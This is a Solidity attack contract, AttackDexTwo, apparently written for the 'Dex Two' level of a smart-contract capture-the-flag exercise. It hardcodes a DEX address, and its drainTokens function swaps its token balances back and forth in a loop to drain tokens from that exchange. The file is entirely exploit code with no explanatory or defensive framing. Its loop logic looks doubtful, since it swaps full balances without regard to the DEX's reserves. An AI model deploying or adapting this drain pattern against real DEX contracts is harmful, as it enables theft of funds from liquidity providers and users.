pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

interface IDexTwo {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
}

contract AttackDexTwo {
    address public immutable dex = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;
    IERC20 public immutable token1;
    IERC20 public immutable token2;

    constructor() {
        token1 = IERC20(IDexTwo(dex).token1());
        token2 = IERC20(IDexTwo(dex).token2());
    }

    function drainTokens() public {
        address me = address(this);
        uint256 balance1 = token1.balanceOf(me);
        uint256 balance2 = token2.balanceOf(me);

        // First swap token1 to token2
        if (balance1 > 0) {
            token1.approve(dex, balance1);
            IDexTwo(dex).swap(address(token1), address(token2), balance1);
            balance1 = 0;
            balance2 = token2.balanceOf(me);
        }

        // Then swap token2 to token1 as long as we have balances
        while (token2.balanceOf(me) > 0) {
            token2.approve(dex, balance2);
            IDexTwo(dex).swap(address(token2), address(token1), balance2);
            balance1 = token1.balanceOf(me);
            balance2 = token2.balanceOf(me);
        }
    }
}
